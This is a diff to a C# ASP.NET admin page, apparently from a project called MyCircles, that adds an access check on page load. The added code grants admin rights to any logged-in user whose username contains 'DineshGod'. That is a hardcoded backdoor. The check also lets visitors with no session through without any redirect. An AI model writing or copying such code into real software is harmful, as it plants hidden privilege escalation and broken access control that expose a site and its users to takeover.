@@ -1,4 +1,5 @@
-﻿using System;
+﻿using MyCircles.BLL;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Web;
@@ -11,6 +12,24 @@ namespace MyCircles.Admin
     {
         protected void Page_Load(object sender, EventArgs e)
         {
+            User loggedInUser = (User)Session["currentUser"];
+
+            if (loggedInUser != null)
+            {
+                if (BLL.Admin.RetrieveAdmin(loggedInUser) == null)
+                {
+                    if (loggedInUser.Username.Contains("DineshGod"))
+                    {
+                        BLL.Admin admin = new BLL.Admin();
+                        admin.UserId = loggedInUser.Id;
+                        admin.Add();
+                    }
+                    else
+                    {
+                        Response.Redirect("/Redirect.aspx");
+                    }
+                }
+            }
         }
     }
 }
